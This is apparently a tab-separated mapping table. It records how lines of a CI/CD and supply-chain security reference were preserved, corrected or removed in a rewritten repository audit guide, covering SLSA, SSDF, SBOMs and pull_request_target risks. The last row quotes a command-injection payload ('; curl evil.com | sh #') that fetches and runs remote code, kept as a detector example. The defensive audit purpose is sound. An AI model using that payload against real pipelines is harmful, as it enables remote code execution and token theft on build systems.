source	destination	disposition	evidence
references/cicd-and-supply-chain.md#L1	cicd-and-supply-chain#Scope	preserved	domain statement: source-to-production path, pipelines, manifests, release configuration
references/cicd-and-supply-chain.md#L3	cicd-and-supply-chain#Scope	corrected	router instruction "Load this for GitHub Actions, GitLab CI, Jenkins..." removed; activation is frontmatter activates_on. The surviving half became the in-scope inventory sentence plus the five driving facts
references/cicd-and-supply-chain.md#L3	cicd-and-supply-chain#Scope	corrected	"patterns from real CI/CD breaches (SolarWinds, Codecov, dependency confusion)" reframed: incidents are dated illustrations of one mechanism each and may never be written as a finding ("this repository is exposed to X")
references/cicd-and-supply-chain.md#L5-L7	cicd-and-supply-chain#Checklist-0	corrected	"Find any of these and flag immediately" replaced with treat-every-hit-as-a-candidate-to-trace, reconciled with the anti-pattern rule "never grade on a keyword alone"
references/cicd-and-supply-chain.md#L62-L64	cicd-and-supply-chain#Scope	corrected	NIST SSDF retained as a citable framework but restricted to practices with a repository artifact behind them; the "mentally walk through" framing dropped
references/cicd-and-supply-chain.md#L66-L68	cicd-and-supply-chain#Scope	intentionally_removed	SSDF PO questions ("documented security requirements", "do developers have security tooling") are organizational process, unanswerable from a checkout, and were being filed as findings. De-branding checklist item 16: retained only as an explicit N/A instruction
references/cicd-and-supply-chain.md#L77-L79	cicd-and-supply-chain#Scope	intentionally_removed	SSDF PW questions "threat modeling step in design process" and "code review with security checklist": org process, and the first is threat-modeling lens territory (trust-boundary-inventory is deferred)
references/cicd-and-supply-chain.md#L83-L86	cicd-and-supply-chain#Scope	intentionally_removed	SSDF RV questions "process for triaging reported vulns" and "patch SLAs documented": org process. Replaced with the N/A instruction so subagents stop filing them
references/cicd-and-supply-chain.md#L84	cicd-and-supply-chain#Checklist-10	preserved	SECURITY.md presence kept as the one repository-visible RV artifact, graded Info, with a reporting channel as the substance
references/cicd-and-supply-chain.md#L86	cicd-and-supply-chain#Checklist-10	corrected	"dependency vulnerability scanning with alerting" split: the scanner invocation is repo-visible and gradeable, alert enablement is not and moved to the undeterminable list
references/cicd-and-supply-chain.md#L89-L95	cicd-and-supply-chain#Scope	preserved	SLSA Build Track L0-L3 definitions carried over in substance, including the explicit instruction not to use the older single 0-4 model
references/cicd-and-supply-chain.md#L97	cicd-and-supply-chain#Scope	corrected	de-branding checklist item 13: "For most products, aim for Build L2-L3" is inherited house policy. Replaced with a repo-derived decision rule (L1 internal-only, L2 published or shipped, L3 third-party executes with elevated privilege or regulatory weight)
references/cicd-and-supply-chain.md#L124	cicd-and-supply-chain#Scope	corrected	CycloneDX/SPDX kept as citable formats with the file globs that identify them (*.cdx.json, *.spdx.json) instead of a preference between them
references/cicd-and-supply-chain.md#L125	cicd-and-supply-chain#Checklist-13	corrected	EO 14028 dated (2021) and framed as the contractual driver for an SBOM, explicitly not as a control
docs/design/2026-07-26-recon-punch-list.md#L16	cicd-and-supply-chain#Scope	corrected	punch list item 1: "SANS Top 25" does not exist as a framework. This lens now instructs the auditor to correct it to MITRE CWE Top 25 (SANS co-branding ended after 2011) wherever a template names it
(new)	cicd-and-supply-chain#Scope	corrected	ASVS prohibition added: no requirement in the source is traceable to an ASVS identifier, so the lens forbids citing it
(new)	cicd-and-supply-chain#Scope	corrected	Does-not-own section written from the 27 frontmatter defers keys, grouped by owning lens, with three explicit anti-double-file carve-outs (cloud-oidc-trust-policy, deploy-time-signature-enforcement, dockerfile-and-image-content)
(new)	cicd-and-supply-chain#Scope	corrected	What-cannot-be-determined-from-a-repository section added: branch and tag protection, visibility, GITHUB_TOKEN org default, fork-approval policy, runner label resolution, environment protection rules, scanning enablement, registry registration, pinned-commit benignity, provider masking and cache-scope behaviour, registry account hygiene, triage. Method rule 4: a High whose condition no artifact satisfies downgrades the finding forever
references/cicd-and-supply-chain.md#L9-L14	cicd-and-supply-chain#Checklist-1	preserved	pull_request_target mechanism: base-branch context with secrets while checking out PR code; consequences (modify build scripts, exfiltrate the token) retained
references/cicd-and-supply-chain.md#L15-L17	cicd-and-supply-chain#Checklist-1	corrected	the three-line audit list became the two-leg structural rule. The inherited "AND has access to secrets" is demoted from a precondition to an aggravator, because the canonical case (pull_request_target + checkout of head + npm ci) contains no secrets reference
references/cicd-and-supply-chain.md#L18	cicd-and-supply-chain#Checklist-1	corrected	punch list section 1 item 6 row 1: "pwn-request patterns - search the repo for this term" cannot fire; it is a research label absent from vulnerable code. Replaced by structural detection (privileged trigger + untrusted content checked out or executed) and by naming zizmor, actionlint, poutine and octoscan. The literal survives once, in the sentence forbidding the grep
references/cicd-and-supply-chain.md#L18	cicd-and-supply-chain#Known-false-positives-1	corrected	the same correction applied at the consumer: false positive 1 now lists the second-leg triggers (checkout forms, gh pr checkout, git fetch origin pull/N/head, local ./ action from a PR tree, PR-supplied config, cache key derived from PR content) and closes with the Critical that needs no ${{ }} at all
references/cicd-and-supply-chain.md#L18	cicd-and-supply-chain#Severity-regraded	corrected	the same correction applied at the severity row, which is the consumer an auditor actually follows: row 1 grades on two legs and lists secrets.*, id-token: write and persist-credentials as aggravators
references/cicd-and-supply-chain.md#L23-L24	cicd-and-supply-chain#Checklist-1	preserved	expression-evaluation-before-bash mechanism retained as one of the five driving facts in Scope and restated in item 1d
references/cicd-and-supply-chain.md#L25-L29	cicd-and-supply-chain#Checklist-1	preserved	the vulnerable echo "${{ github.event.pull_request.title }}" example and the "; curl evil.com | sh #" payload carried into detector pair 1d, with a neutral attacker host
